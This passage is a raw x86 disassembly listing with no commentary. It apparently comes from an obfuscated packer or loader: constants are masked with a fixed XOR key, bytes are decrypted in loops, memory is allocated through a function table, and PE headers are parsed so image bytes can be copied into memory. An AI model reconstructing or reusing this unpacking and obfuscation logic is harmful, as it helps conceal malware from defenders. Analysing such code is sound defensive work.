  4250ad:	mov    edx,DWORD PTR [ebp-0x54]
  4250b0:	mov    eax,DWORD PTR [eax+0x1e0]
  4250b6:	xor    edx,ebx
  4250b8:	add    edx,esi
  4250ba:	push   edx
  4250bb:	mov    edx,DWORD PTR [ebp-0x40]
  4250be:	xor    edx,ebx
  4250c0:	add    edx,esi
  4250c2:	push   edx
  4250c3:	push   ecx
  4250c4:	mov    DWORD PTR [ebp-0x38],ecx
  4250c7:	mov    ecx,DWORD PTR [ebp-0x10]
  4250ca:	xor    ecx,ebx
  4250cc:	add    ecx,esi
  4250ce:	push   ecx
  4250cf:	call   DWORD PTR [eax+0x14]
  4250d2:	mov    edi,eax
  4250d4:	mov    eax,DWORD PTR [ebp-0x10]
  4250d7:	xor    eax,ebx
  4250d9:	add    eax,esi
  4250db:	cmp    eax,edi
  4250dd:	je     0x425138
  4250df:	mov    eax,DWORD PTR [ebp-0x10]
  4250e2:	jmp    0x425105
  4250e4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4250e7:	xor    eax,ebx
  4250e9:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f6]
  4250f0:	mov    BYTE PTR [eax+edi*1+0x3272f6],cl
  4250f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4250fa:	xor    ecx,ebx
  4250fc:	lea    eax,[ecx+eax*1+0x3272f6]
  425103:	xor    eax,ebx
  425105:	mov    ecx,DWORD PTR [ebp-0x3c]
  425108:	sub    ecx,esi
  42510a:	xor    ecx,ebx
  42510c:	cmp    eax,ecx
  42510e:	jne    0x4250e4
  425110:	mov    eax,DWORD PTR [ebp+0x8]
  425113:	mov    ecx,DWORD PTR [ebp-0x50]
  425116:	mov    eax,DWORD PTR [eax+0x1e0]
  42511c:	xor    ecx,ebx
  42511e:	add    ecx,esi
  425120:	push   ecx
  425121:	mov    ecx,DWORD PTR [ebp-0x10]
  425124:	xor    ecx,ebx
  425126:	add    ecx,esi
  425128:	push   ecx
  425129:	push   DWORD PTR [ebp-0x2c]
  42512c:	call   DWORD PTR [eax+0x18]
  42512f:	mov    eax,DWORD PTR [ebp-0x38]
  425132:	mov    DWORD PTR [ebp-0x2c],edi
  425135:	mov    DWORD PTR [ebp-0x3c],eax
  425138:	mov    eax,DWORD PTR [ebp-0x2c]
  42513b:	mov    DWORD PTR [ebp-0x14],eax
  42513e:	mov    eax,DWORD PTR [ebp-0x18]
  425141:	mov    ecx,DWORD PTR [ebp-0x10]
  425144:	xor    eax,ebx
  425146:	add    eax,esi
  425148:	mov    DWORD PTR [ebp-0x5c],0x422b332b
  42514f:	mov    DWORD PTR [ebp-0x58],0x382b402b
  425156:	jmp    0x425189
  425158:	mov    edx,DWORD PTR [ebp-0x14]
  42515b:	mov    edi,ecx
  42515d:	xor    edi,ebx
  42515f:	mov    cl,BYTE PTR [ebp+edi*1+0x32729a]
  425166:	movsx  edx,BYTE PTR [edi+edx*1+0x3272f6]
  42516e:	xor    cl,0x7f
  425171:	add    cl,0x4
  425174:	movzx  ecx,cl
  425177:	cmp    edx,ecx
  425179:	jne    0x425193
  42517b:	mov    ecx,DWORD PTR [ebp-0x18]
  42517e:	xor    ecx,ebx
  425180:	lea    ecx,[ecx+edi*1+0x3272f6]
  425187:	xor    ecx,ebx
  425189:	cmp    ecx,0xf89c85bd
  42518f:	jne    0x425158
  425191:	jmp    0x42519a
  425193:	mov    eax,DWORD PTR [ebp-0x10]
  425196:	xor    eax,ebx
  425198:	add    eax,esi
  42519a:	mov    ecx,DWORD PTR [ebp-0x10]
  42519d:	xor    ecx,ebx
  42519f:	add    ecx,esi
  4251a1:	cmp    ecx,eax
  4251a3:	je     0x425319
  4251a9:	mov    eax,DWORD PTR [ebp-0x14]
  4251ac:	mov    eax,DWORD PTR [eax+0x8]
  4251af:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4251b6:	mov    DWORD PTR [ebp-0x40],0xf89cc3d6
  4251bd:	mov    DWORD PTR [ebp-0x44],0xf89cb5a5
  4251c4:	mov    DWORD PTR [ebp-0x24],0xf89c85a1
  4251cb:	mov    DWORD PTR [ebp-0x20],eax
  4251ce:	mov    eax,DWORD PTR [ebp+0x8]
  4251d1:	mov    ecx,DWORD PTR [ebp-0x24]
  4251d4:	xor    ecx,ebx
  4251d6:	add    ecx,esi
  4251d8:	push   ecx
  4251d9:	mov    ecx,DWORD PTR [ebp-0x44]
  4251dc:	mov    eax,DWORD PTR [eax+0x1e0]
  4251e2:	xor    ecx,ebx
  4251e4:	add    ecx,esi
  4251e6:	push   ecx
  4251e7:	mov    ecx,DWORD PTR [ebp-0x40]
  4251ea:	xor    ecx,ebx
  4251ec:	add    ecx,esi
  4251ee:	push   ecx
  4251ef:	mov    ecx,DWORD PTR [ebp-0xc]
  4251f2:	xor    ecx,ebx
  4251f4:	add    ecx,esi
  4251f6:	push   ecx
  4251f7:	call   DWORD PTR [eax+0x14]
  4251fa:	mov    edi,eax
  4251fc:	mov    eax,DWORD PTR [ebp+0x8]
  4251ff:	mov    ecx,DWORD PTR [ebp-0x24]
  425202:	mov    eax,DWORD PTR [eax+0x1e0]
  425208:	xor    ecx,ebx
  42520a:	add    ecx,esi
  42520c:	push   ecx
  42520d:	mov    ecx,DWORD PTR [ebp-0x44]
  425210:	xor    ecx,ebx
  425212:	add    ecx,esi
  425214:	push   ecx
  425215:	mov    ecx,DWORD PTR [ebp-0xc]
  425218:	push   DWORD PTR [ebp-0x20]
  42521b:	xor    ecx,ebx
  42521d:	add    ecx,esi
  42521f:	push   ecx
  425220:	call   DWORD PTR [eax+0x14]
  425223:	mov    ecx,DWORD PTR [ebp-0xc]
  425226:	xor    ecx,ebx
  425228:	add    ecx,esi
  42522a:	mov    DWORD PTR [ebp-0x24],eax
  42522d:	cmp    ecx,edi
  42522f:	je     0x4255bc
  425235:	mov    ecx,DWORD PTR [ebp-0xc]
  425238:	xor    ecx,ebx
  42523a:	add    ecx,esi
  42523c:	cmp    ecx,eax
  42523e:	je     0x4255bc
  425244:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  42524b:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  425252:	mov    ecx,DWORD PTR [ebp-0x40]
  425255:	xor    cl,0xaf
  425258:	sub    cl,0xa
  42525b:	mov    BYTE PTR [edi],cl
  42525d:	mov    ecx,DWORD PTR [ebp-0xc]
  425260:	xor    cl,0xaf
  425263:	sub    cl,0xa
  425266:	mov    BYTE PTR [edi+0x1],cl
  425269:	mov    ecx,DWORD PTR [ebp-0x54]
  42526c:	xor    cl,0xaf
  42526f:	sub    cl,0xa
  425272:	mov    BYTE PTR [edi+0x2],cl
  425275:	and    DWORD PTR [ebp-0xc8],0x0
  42527c:	and    DWORD PTR [ebp-0xdc],0x0
  425283:	lea    ecx,[ebp-0xdc]
  425289:	push   ecx
  42528a:	push   DWORD PTR [ebp-0x20]
  42528d:	push   eax
  42528e:	lea    eax,[ebp-0xc8]
  425294:	push   eax
  425295:	mov    eax,DWORD PTR [ebp-0x14]
  425298:	push   DWORD PTR [eax+0xc]
  42529b:	mov    eax,DWORD PTR [ebp-0x2c]
  42529e:	add    eax,0x10
  4252a1:	push   eax
  4252a2:	push   edi
  4252a3:	call   0x424547
  4252a8:	mov    DWORD PTR [ebp-0x40],eax
  4252ab:	mov    eax,DWORD PTR [ebp+0x8]
  4252ae:	mov    ecx,DWORD PTR [ebp-0x50]
  4252b1:	mov    eax,DWORD PTR [eax+0x1e0]
  4252b7:	xor    ecx,ebx
  4252b9:	add    ecx,esi
  4252bb:	push   ecx
  4252bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4252bf:	xor    ecx,ebx
  4252c1:	add    ecx,esi
  4252c3:	push   ecx
  4252c4:	push   edi
  4252c5:	call   DWORD PTR [eax+0x18]
  4252c8:	mov    eax,DWORD PTR [ebp-0x40]
  4252cb:	add    eax,0xffcd8d0a
  4252d0:	xor    eax,ebx
  4252d2:	cmp    eax,0xf89c85a5
  4252d7:	mov    eax,DWORD PTR [ebp+0x8]
  4252da:	mov    eax,DWORD PTR [eax+0x1e0]
  4252e0:	mov    ecx,DWORD PTR [ebp-0x50]
  4252e3:	jne    0x425306
  4252e5:	xor    ecx,ebx
  4252e7:	add    ecx,esi
  4252e9:	push   ecx
  4252ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4252ed:	xor    ecx,ebx
  4252ef:	add    ecx,esi
  4252f1:	push   ecx
  4252f2:	push   DWORD PTR [ebp-0x2c]
  4252f5:	call   DWORD PTR [eax+0x18]
  4252f8:	mov    eax,DWORD PTR [ebp-0x24]
  4252fb:	mov    DWORD PTR [ebp-0x2c],eax
  4252fe:	mov    eax,DWORD PTR [ebp-0x20]
  425301:	mov    DWORD PTR [ebp-0x3c],eax
  425304:	jmp    0x425319
  425306:	xor    ecx,ebx
  425308:	add    ecx,esi
  42530a:	push   ecx
  42530b:	mov    ecx,DWORD PTR [ebp-0xc]
  42530e:	xor    ecx,ebx
  425310:	add    ecx,esi
  425312:	push   ecx
  425313:	push   DWORD PTR [ebp-0x24]
  425316:	call   DWORD PTR [eax+0x18]
  425319:	mov    eax,DWORD PTR [ebp-0x3c]
  42531c:	mov    DWORD PTR [ebp-0x34],eax
  42531f:	mov    eax,DWORD PTR [ebp-0x2c]
  425322:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  425329:	mov    DWORD PTR [ebp-0x40],eax
  42532c:	mov    edi,0xf89c85a4
  425331:	mov    DWORD PTR [ebp-0x30],edi
  425334:	mov    eax,DWORD PTR [ebp-0x28]
  425337:	xor    eax,ebx
  425339:	add    eax,esi
  42533b:	mov    DWORD PTR [ebp-0xc],eax
  42533e:	mov    eax,DWORD PTR [ebp-0x28]
  425341:	xor    eax,ebx
  425343:	add    eax,esi
  425345:	mov    DWORD PTR [ebp-0x14],eax
  425348:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  42534f:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  425356:	mov    eax,DWORD PTR [ebp-0x28]
  425359:	mov    ecx,DWORD PTR [ebp-0x34]
  42535c:	xor    eax,ebx
  42535e:	add    eax,esi
  425360:	cmp    ecx,eax
  425362:	je     0x425558
  425368:	jmp    0x425534
  42536d:	mov    ecx,DWORD PTR [ebp-0xc]
  425370:	mov    eax,DWORD PTR [ebp-0x34]
  425373:	sub    eax,ecx
  425375:	mov    ecx,DWORD PTR [ebp-0x44]
  425378:	xor    ecx,ebx
  42537a:	add    ecx,esi
  42537c:	xor    edx,edx
  42537e:	div    ecx
  425380:	mov    DWORD PTR [ebp-0x14],eax
  425383:	mov    eax,DWORD PTR [ebp-0x24]
  425386:	mov    ecx,DWORD PTR [ebp-0x14]
  425389:	xor    eax,ebx
  42538b:	add    eax,esi
  42538d:	cmp    ecx,eax
  42538f:	jbe    0x42539b
  425391:	mov    eax,DWORD PTR [ebp-0x24]
  425394:	xor    eax,ebx
  425396:	add    eax,esi
  425398:	mov    DWORD PTR [ebp-0x14],eax
  42539b:	mov    eax,DWORD PTR [ebp-0x44]
  42539e:	mov    ecx,DWORD PTR [ebp-0x14]
  4253a1:	xor    eax,ebx
  4253a3:	add    eax,esi
  4253a5:	imul   eax,ecx
  4253a8:	mov    DWORD PTR [ebp-0x14],eax
  4253ab:	mov    eax,DWORD PTR [ebp-0x28]
  4253ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4253b1:	xor    eax,ebx
  4253b3:	add    eax,esi
  4253b5:	cmp    ecx,eax
  4253b7:	je     0x425522
  4253bd:	mov    eax,DWORD PTR [ebp-0x14]
  4253c0:	mov    DWORD PTR [ebp-0x20],eax
  4253c3:	mov    eax,DWORD PTR [ebp-0xc]
  4253c6:	add    eax,DWORD PTR [ebp-0x40]
  4253c9:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  4253d0:	mov    DWORD PTR [ebp-0x14],edi
  4253d3:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  4253da:	mov    DWORD PTR [ebp-0x1c],eax
  4253dd:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  4253e4:	mov    DWORD PTR [ebp-0x8],edi
  4253e7:	mov    eax,DWORD PTR [ebp-0x4c]
  4253ea:	xor    eax,ebx
  4253ec:	add    eax,esi
  4253ee:	jmp    0x4254e1
  4253f3:	mov    DWORD PTR [ebp-0xe4],0xf89c85ba
  4253fd:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  425407:	mov    eax,DWORD PTR [ebp-0x8]
  42540a:	mov    ecx,DWORD PTR [ebp-0x18]
  42540d:	xor    eax,ebx
  42540f:	add    eax,esi
  425411:	imul   eax,ecx
  425414:	mov    ecx,DWORD PTR [ebp-0x1c]
  425417:	mov    al,BYTE PTR [eax+ecx*1]
  42541a:	mov    BYTE PTR [ebp-0x1],al
  42541d:	mov    eax,DWORD PTR [ebp-0x8]
  425420:	mov    ecx,DWORD PTR [ebp-0x18]
  425423:	xor    eax,ebx
  425425:	add    eax,esi
  425427:	imul   eax,ecx
  42542a:	mov    ecx,DWORD PTR [ebp-0x54]
  42542d:	xor    ecx,ebx
  42542f:	add    eax,ecx
  425431:	mov    ecx,DWORD PTR [ebp-0x1c]
  425434:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42543c:	mov    ecx,DWORD PTR [ebp-0xe4]
  425442:	xor    ecx,ebx
  425444:	lea    eax,[ecx+eax*1+0x3272f6]
  42544b:	movzx  ecx,BYTE PTR [ebp-0x1]
  42544f:	xor    ecx,eax
  425451:	mov    BYTE PTR [ebp-0x1],cl
  425454:	mov    al,BYTE PTR [ebp-0x1]
  425457:	mov    ecx,DWORD PTR [ebp-0x8]
  42545a:	mov    edx,DWORD PTR [ebp-0x18]
  42545d:	xor    ecx,ebx
  42545f:	add    ecx,esi
  425461:	imul   ecx,edx
  425464:	mov    edx,DWORD PTR [ebp-0x1c]
  425467:	mov    BYTE PTR [ecx+edx*1],al
  42546a:	mov    eax,DWORD PTR [ebp-0x8]
  42546d:	mov    ecx,DWORD PTR [ebp-0x18]
  425470:	xor    eax,ebx
  425472:	add    eax,esi
  425474:	imul   eax,ecx
  425477:	mov    ecx,DWORD PTR [ebp-0x1c]
  42547a:	mov    al,BYTE PTR [eax+ecx*1]
  42547d:	mov    BYTE PTR [ebp-0x1],al
  425480:	mov    eax,DWORD PTR [ebp-0x8]
  425483:	mov    ecx,DWORD PTR [ebp-0x18]
  425486:	xor    eax,ebx
  425488:	add    eax,esi
  42548a:	imul   eax,ecx
  42548d:	mov    ecx,DWORD PTR [ebp-0x14]
  425490:	xor    ecx,ebx
  425492:	add    eax,ecx
  425494:	mov    ecx,DWORD PTR [ebp-0x1c]
  425497:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42549f:	mov    ecx,DWORD PTR [ebp-0xd0]
  4254a5:	xor    ecx,ebx
  4254a7:	lea    eax,[ecx+eax*1+0x3272f6]
  4254ae:	movzx  ecx,BYTE PTR [ebp-0x1]
  4254b2:	xor    ecx,eax
  4254b4:	mov    BYTE PTR [ebp-0x1],cl
  4254b7:	mov    al,BYTE PTR [ebp-0x1]
  4254ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4254bd:	mov    edx,DWORD PTR [ebp-0x18]
  4254c0:	xor    ecx,ebx
  4254c2:	add    ecx,esi
  4254c4:	imul   ecx,edx
  4254c7:	mov    edx,DWORD PTR [ebp-0x1c]
  4254ca:	mov    BYTE PTR [ecx+edx*1],al
  4254cd:	mov    eax,DWORD PTR [ebp-0x38]
  4254d0:	mov    ecx,DWORD PTR [ebp-0x14]
  4254d3:	xor    eax,ebx
  4254d5:	xor    ecx,ebx
  4254d7:	add    eax,esi
  4254d9:	add    ecx,esi
  4254db:	imul   eax,ecx
  4254de:	add    eax,DWORD PTR [ebp-0x18]
  4254e1:	mov    DWORD PTR [ebp-0x18],eax
  4254e4:	mov    eax,DWORD PTR [ebp-0x18]
  4254e7:	mov    ecx,DWORD PTR [ebp-0x20]
  4254ea:	cmp    ecx,eax
  4254ec:	jb     0x4253f3
  4254f2:	mov    eax,DWORD PTR [ebp-0x14]
  4254f5:	mov    ecx,DWORD PTR [ebp-0x20]
  4254f8:	xor    eax,ebx
  4254fa:	add    eax,esi
  4254fc:	imul   eax,ecx
  4254ff:	mov    ecx,DWORD PTR [ebp-0x4c]
  425502:	xor    ecx,ebx
  425504:	add    ecx,esi
  425506:	or     eax,ecx
  425508:	mov    ecx,DWORD PTR [ebp-0x30]
  42550b:	xor    ecx,ebx
  42550d:	add    eax,ecx
  42550f:	mov    ecx,DWORD PTR [ebp-0x30]
  425512:	xor    ecx,ebx
  425514:	add    eax,ecx
  425516:	mov    ecx,DWORD PTR [ebp-0xc]
  425519:	lea    eax,[eax+ecx*1+0x64e5ec]
  425520:	jmp    0x425531
  425522:	mov    eax,DWORD PTR [ebp-0x30]
  425525:	mov    ecx,DWORD PTR [ebp-0xc]
  425528:	xor    eax,ebx
  42552a:	lea    eax,[eax+ecx*1+0x3272f6]
  425531:	mov    DWORD PTR [ebp-0xc],eax
  425534:	mov    eax,DWORD PTR [ebp-0x30]
  425537:	xor    eax,ebx
  425539:	mov    ecx,0xffcd8d0a
  42553e:	sub    ecx,eax
  425540:	add    ecx,DWORD PTR [ebp-0x34]
  425543:	mov    eax,DWORD PTR [ebp-0x30]
  425546:	mov    edx,DWORD PTR [ebp-0xc]
  425549:	xor    eax,ebx
  42554b:	add    eax,esi
  42554d:	imul   eax,edx
  425550:	cmp    eax,ecx
  425552:	jbe    0x42536d
  425558:	push   DWORD PTR [ebp+0x8]
  42555b:	mov    eax,DWORD PTR [ebp+0x8]
  42555e:	push   DWORD PTR [eax+0x1cc]
  425564:	lea    eax,[ebp-0xd8]
  42556a:	push   eax
  42556b:	mov    eax,DWORD PTR [ebp+0x8]
  42556e:	mov    eax,DWORD PTR [eax+0x1c4]
  425574:	push   DWORD PTR [eax]
  425576:	mov    eax,DWORD PTR [ebp+0x8]
  425579:	mov    eax,DWORD PTR [eax+0x1c0]
  42557f:	push   DWORD PTR [eax]
  425581:	push   DWORD PTR [ebp-0x3c]
  425584:	push   DWORD PTR [ebp-0x2c]
  425587:	call   0x42601e
  42558c:	mov    DWORD PTR [ebp-0x40],eax
  42558f:	mov    eax,DWORD PTR [ebp-0x10]
  425592:	mov    ecx,DWORD PTR [ebp-0x2c]
  425595:	xor    eax,ebx
  425597:	add    eax,esi
  425599:	cmp    eax,ecx
  42559b:	je     0x4255bc
  42559d:	mov    eax,DWORD PTR [ebp+0x8]
  4255a0:	mov    ecx,DWORD PTR [ebp-0x50]
  4255a3:	mov    eax,DWORD PTR [eax+0x1e0]
  4255a9:	xor    ecx,ebx
  4255ab:	add    ecx,esi
  4255ad:	push   ecx
  4255ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4255b1:	xor    ecx,ebx
  4255b3:	add    ecx,esi
  4255b5:	push   ecx
  4255b6:	push   DWORD PTR [ebp-0x2c]
  4255b9:	call   DWORD PTR [eax+0x18]
  4255bc:	pop    edi
  4255bd:	pop    esi
  4255be:	pop    ebx
  4255bf:	leave  
  4255c0:	ret    0x4
  4255c3:	push   ebp
  4255c4:	mov    ebp,esp
  4255c6:	push   ecx
  4255c7:	push   ecx
  4255c8:	lea    eax,[ebp-0x8]
  4255cb:	mov    DWORD PTR [ebp-0x4],eax
  4255ce:	push   esi
  4255cf:	mov    esi,DWORD PTR [ebp-0x4]
  4255d2:	mov    eax,0xf881ba2f
  4255d7:	mov    DWORD PTR [esi],eax
  4255d9:	mov    esi,DWORD PTR [ebp-0x8]
  4255dc:	cmp    esi,eax
  4255de:	pop    esi
  4255df:	jne    0x4255e9
  4255e1:	mov    BYTE PTR [ecx+0xa],0x83
  4255e5:	mov    BYTE PTR [edx+0x8],0x30
  4255e9:	mov    BYTE PTR [edx+0xa],0x83
  4255ed:	mov    BYTE PTR [ecx+0x2],0x15
  4255f1:	leave  
  4255f2:	ret    
  4255f3:	push   ebp
  4255f4:	mov    ebp,esp
  4255f6:	push   ecx
  4255f7:	push   ecx
  4255f8:	lea    eax,[ebp-0x8]
  4255fb:	mov    DWORD PTR [ebp-0x4],eax
  4255fe:	mov    edx,DWORD PTR [ebp-0x4]
  425601:	mov    eax,0xf88b0bcb
  425606:	mov    DWORD PTR [edx],eax
  425608:	mov    edx,DWORD PTR [ebp-0x8]
  42560b:	cmp    edx,eax
  42560d:	jne    0x42561e
  42560f:	mov    eax,DWORD PTR [ebp+0x8]
  425612:	mov    BYTE PTR [ecx+0x9],0xf
  425616:	mov    BYTE PTR [eax+0x7],0x58
  42561a:	mov    BYTE PTR [ecx+0x6],0x10
  42561e:	mov    BYTE PTR [ecx+0x3],0x1f
  425622:	leave  
  425623:	ret    0x4
  425626:	push   ebp
  425627:	mov    ebp,esp
  425629:	push   ecx
  42562a:	push   ecx
  42562b:	lea    eax,[ebp-0x8]
  42562e:	mov    DWORD PTR [ebp-0x4],eax
  425631:	mov    edx,DWORD PTR [ebp-0x4]
  425634:	mov    eax,0x7e0da2f
  425639:	mov    DWORD PTR [edx],eax
  42563b:	mov    edx,DWORD PTR [ebp-0x8]
  42563e:	cmp    edx,eax
  425640:	jne    0x425646
  425642:	mov    BYTE PTR [ecx+0x7],0x58
  425646:	mov    eax,DWORD PTR [ebp+0x8]
  425649:	mov    BYTE PTR [ecx+0x1],0x1a
  42564d:	mov    BYTE PTR [eax+0x9],0x2f
  425651:	leave  
  425652:	ret    0x4
  425655:	push   ebp
  425656:	mov    ebp,esp
  425658:	push   ecx
  425659:	push   ecx
  42565a:	lea    eax,[ebp-0x8]
  42565d:	mov    DWORD PTR [ebp-0x4],eax
  425660:	push   esi
  425661:	mov    esi,DWORD PTR [ebp-0x4]
  425664:	mov    eax,0x7060e3e
  425669:	mov    DWORD PTR [esi],eax
  42566b:	mov    esi,DWORD PTR [ebp-0x8]
  42566e:	cmp    esi,eax
  425670:	pop    esi
  425671:	jne    0x42567d
  425673:	mov    BYTE PTR [edx+0x4],0x14
  425677:	mov    WORD PTR [ecx+0x3],0x141f
  42567d:	mov    BYTE PTR [edx],0x40
  425680:	leave  
  425681:	ret    
  425682:	push   ebp
  425683:	mov    ebp,esp
  425685:	push   ecx
  425686:	push   ecx
  425687:	lea    eax,[ebp-0x8]
  42568a:	mov    DWORD PTR [ebp-0x4],eax
  42568d:	mov    edx,DWORD PTR [ebp-0x4]
  425690:	mov    eax,0xf8870b3f
  425695:	mov    DWORD PTR [edx],eax
  425697:	mov    edx,DWORD PTR [ebp-0x8]
  42569a:	cmp    edx,eax
  42569c:	jne    0x4256a9
  42569e:	mov    eax,DWORD PTR [ebp+0x8]
  4256a1:	mov    BYTE PTR [ecx+0x8],0x10
  4256a5:	mov    BYTE PTR [eax+0x1],0x1a
  4256a9:	mov    BYTE PTR [ecx+0x5],0xc
  4256ad:	leave  
  4256ae:	ret    0x4
  4256b1:	push   esi
  4256b2:	mov    ecx,edi
  4256b4:	call   0x425682
  4256b9:	mov    edx,edi
  4256bb:	mov    ecx,esi
  4256bd:	mov    BYTE PTR [esi],0x20
  4256c0:	call   0x425655
  4256c5:	push   esi
  4256c6:	mov    ecx,edi
  4256c8:	mov    BYTE PTR [esi+0x5],0xc
  4256cc:	call   0x425626
  4256d1:	push   esi
  4256d2:	mov    BYTE PTR [esi+0x6],0x10
  4256d6:	call   0x4255f3
  4256db:	mov    BYTE PTR [esi+0x2],0x15
  4256df:	mov    edx,esi
  4256e1:	jmp    0x4255c3
  4256e6:	push   ebp
  4256e7:	mov    ebp,esp
  4256e9:	push   ecx
  4256ea:	mov    ecx,DWORD PTR [edx+0x194]
  4256f0:	push   esi
  4256f1:	mov    esi,DWORD PTR [ebp+0x8]
  4256f4:	mov    esi,DWORD PTR [esi]
  4256f6:	mov    DWORD PTR [ecx],esi
  4256f8:	mov    ecx,DWORD PTR [edx+0x194]
  4256fe:	mov    ecx,DWORD PTR [ecx]
  425700:	mov    esi,DWORD PTR [edx+0x190]
  425706:	mov    DWORD PTR [esi],ecx
  425708:	mov    eax,DWORD PTR [edx+0x194]
  42570e:	mov    ecx,DWORD PTR [eax]
  425710:	mov    ecx,DWORD PTR [ecx+0x3c]
  425713:	add    ecx,DWORD PTR [eax]
  425715:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  42571c:	mov    eax,DWORD PTR [ebp-0x4]
  42571f:	movzx  ecx,WORD PTR [ecx+0x16]
  425723:	xor    eax,0x75108af
  425728:	add    eax,0x3272f6
  42572d:	pop    esi
  42572e:	test   ecx,eax
  425730:	je     0x42573e
  425732:	mov    eax,DWORD PTR [edx+0x1c8]
  425738:	mov    DWORD PTR [eax],0xf89c85a4
  42573e:	leave  
  42573f:	ret    0x4
  425742:	push   ebp
  425743:	mov    ebp,esp
  425745:	sub    esp,0x70
  425748:	and    DWORD PTR [ebp-0x20],0x0
  42574c:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  425753:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  42575a:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  425761:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  425768:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  42576f:	mov    eax,DWORD PTR [ebp+0x20]
  425772:	mov    eax,DWORD PTR [eax+0x194]
  425778:	mov    DWORD PTR [ebp-0xc],eax
  42577b:	mov    eax,DWORD PTR [ebp+0x20]
  42577e:	push   ebx
  42577f:	push   esi
  425780:	mov    esi,DWORD PTR [eax+0x190]
  425786:	mov    eax,DWORD PTR [ebp+0x20]
  425789:	mov    eax,DWORD PTR [eax+0x18c]
  42578f:	mov    DWORD PTR [ebp-0x8],eax
  425792:	mov    eax,DWORD PTR [eax]
  425794:	push   edi
  425795:	mov    DWORD PTR [ebp-0x4],esi
  425798:	test   eax,eax
  42579a:	jne    0x4257a7
  42579c:	push   DWORD PTR [ebp+0x1c]
  42579f:	mov    edx,DWORD PTR [ebp+0x20]
  4257a2:	call   0x4256e6
  4257a7:	mov    eax,DWORD PTR [esi]
  4257a9:	mov    ebx,DWORD PTR [esi]
  4257ab:	add    ebx,DWORD PTR [eax+0x3c]
  4257ae:	mov    eax,DWORD PTR [ebp+0xc]
  4257b1:	mov    ecx,DWORD PTR [ebp-0x8]
  4257b4:	mov    ecx,DWORD PTR [ecx]
  4257b6:	mov    esi,0x75108af
  4257bb:	xor    eax,esi
  4257bd:	mov    edi,0x3272f6
  4257c2:	add    eax,edi
  4257c4:	cmp    eax,ecx
  4257c6:	jne    0x4259fe
  4257cc:	mov    eax,DWORD PTR [ebp-0xc]
  4257cf:	mov    eax,DWORD PTR [eax]
  4257d1:	mov    DWORD PTR [ebp-0x10],eax
  4257d4:	mov    eax,DWORD PTR [ebx+0x50]
  4257d7:	mov    DWORD PTR [ebp-0x68],eax
  4257da:	mov    eax,DWORD PTR [ebp-0x18]
  4257dd:	xor    eax,esi
  4257df:	add    eax,edi
  4257e1:	mov    DWORD PTR [ebp-0x64],eax
  4257e4:	mov    eax,DWORD PTR [ebp-0x14]
  4257e7:	and    DWORD PTR [ebp-0x6c],0x0
  4257eb:	xor    eax,esi
  4257ed:	add    eax,edi
  4257ef:	mov    DWORD PTR [ebp-0x60],eax
  4257f2:	lea    eax,[ebp-0x70]
  4257f5:	push   eax
  4257f6:	mov    eax,DWORD PTR [ebp+0x8]
  4257f9:	xor    eax,esi
  4257fb:	add    eax,edi
  4257fd:	push   eax
  4257fe:	mov    eax,DWORD PTR [ebp+0x20]
  425801:	add    eax,0xaa
  425806:	push   eax
  425807:	mov    eax,DWORD PTR [ebp+0x20]
  42580a:	mov    eax,DWORD PTR [eax+0x198]
  425810:	mov    DWORD PTR [ebp-0x70],0x4
  425817:	push   DWORD PTR [eax]
  425819:	mov    eax,DWORD PTR [ebp+0x10]
  42581c:	call   eax
  42581e:	mov    ecx,DWORD PTR [ebp-0xc]
  425821:	mov    ecx,DWORD PTR [ecx]
  425823:	mov    edx,DWORD PTR [ebp-0x8]
  425826:	mov    DWORD PTR [ebp-0x6c],eax
  425829:	mov    DWORD PTR [ebp+0x1c],eax
  42582c:	mov    DWORD PTR [edx],ecx
  42582e:	mov    ecx,DWORD PTR [ebp-0x4]
  425831:	mov    DWORD PTR [ecx],eax
  425833:	mov    eax,DWORD PTR [ebx+0x50]
  425836:	mov    DWORD PTR [ebp-0x68],eax
  425839:	mov    eax,DWORD PTR [ebp-0x1c]
  42583c:	xor    eax,esi
  42583e:	add    eax,edi
  425840:	mov    DWORD PTR [ebp-0x64],eax
  425843:	lea    eax,[ebp-0x20]
  425846:	mov    DWORD PTR [ebp-0x60],eax
  425849:	lea    eax,[ebp-0x70]
  42584c:	push   eax
  42584d:	mov    eax,DWORD PTR [ebp+0x8]
  425850:	xor    eax,esi
  425852:	add    eax,edi
  425854:	push   eax
  425855:	mov    eax,DWORD PTR [ebp+0x20]
  425858:	add    eax,0xee
  42585d:	push   eax
  42585e:	mov    eax,DWORD PTR [ebp+0x20]
  425861:	mov    eax,DWORD PTR [eax+0x198]
  425867:	mov    DWORD PTR [ebp-0x70],0x4
  42586e:	push   DWORD PTR [eax]
  425870:	mov    eax,DWORD PTR [ebp+0x10]
  425873:	call   eax
  425875:	test   eax,eax
  425877:	je     0x42589c
  425879:	and    DWORD PTR [ebp+0xc],0x0
  42587d:	cmp    DWORD PTR [ebx+0x50],0x0
  425881:	jbe    0x42589c
  425883:	mov    eax,DWORD PTR [ebp+0x1c]
  425886:	mov    ecx,DWORD PTR [ebp-0x10]
  425889:	sub    ecx,eax
  42588b:	mov    dl,BYTE PTR [ecx+eax*1]
  42588e:	inc    DWORD PTR [ebp+0xc]
  425891:	mov    BYTE PTR [eax],dl
